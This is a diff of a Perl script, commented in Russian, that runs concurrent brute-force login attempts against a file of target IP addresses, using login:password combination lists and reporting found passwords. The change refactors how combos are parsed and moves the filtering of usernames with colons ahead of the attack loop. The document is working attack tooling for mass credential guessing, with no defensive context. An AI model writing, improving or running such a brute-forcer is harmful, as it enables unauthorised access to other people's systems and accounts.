@@ -9,7 +9,7 @@ use File::Slurp qw/read_file/;
 use feature qw/say switch unicode_strings/;
 
 use Coro;
-use Coro::Select;
+use Coro::LWP;
 use Coro::Channel;
 
 use URI;
@@ -164,6 +164,26 @@ undef(@logins);
 undef(@passwords);
 undef(%comboHash);
 
+sub combo_to_login_and_password {
+    return map {s/\\(.)/$1/gr} split /(?<!\\):/, $_[0];
+}
+
+# Фильтруем заведомо неприемлимые логины
+@comboList = grep {
+    my ($login, $password) = combo_to_login_and_password($_);
+    my $exclude = $login =~ /:/ ? 0 : 1;
+
+    say '[F][!] Colon is not allowed in username! Skip [ ' . $login . ' | ' . $password . ' ]'
+        unless $exclude;
+
+    $exclude;
+} @comboList;
+
+if (@comboList == 0) {
+    say '[G][!]An error occurred while generating login:password combinations, the final set of combinations was empty!';
+    exit(1);
+}
+
 # Читаем айпишники в массив
 my @ipList = grep {defined $_ and $_ ne ''} uniq read_file($args->{targets_file}, chomp => 1);
 say 'IP list size: ' . scalar(@ipList);
@@ -177,34 +197,15 @@ my $progress = Term::ProgressBar->new({
 });
 $progress->update(0);
 
-sub combo_to_pair {
-    my ($combo) = @_;
-
-    # Делим строку по не экранированному двоеточию
-    my ($login, $password) = split /(?<!\\):/, $combo;
-
-    # Обрабатываем экранирование
-    $login =~ s/\\(.)/$1/g;
-    $password =~ s/\\(.)/$1/g;
-
-    return ($login, $password);
-}
-
 sub bruteforce {
     my ($ip_address, $ua, $progress_bar, $combo_list) = @_;
 
     my $password_found = 0;
     for my $i (0 .. $#{$combo_list}) {
-        my ($login, $password) = combo_to_pair $combo_list->[$i];
+        my ($login, $password) = combo_to_login_and_password $combo_list->[$i];
 
         $progress_bar->message('[B][i] ' . $combo_list->[$i] . ' -> ' . $login . ' | ' . $password)
             if $args->{debug};
-
-        if ($login =~ /:/) {
-            $progress_bar->message('[B][!] Colon is not allowed in username! Skip [ ' . $login . ' : ' . $password . ' ]');
-            $progress_bar->update();
-            next;
-        }
 
         if (login($ip_address, $login, $password, $ua)) {
             $password_found = 1;
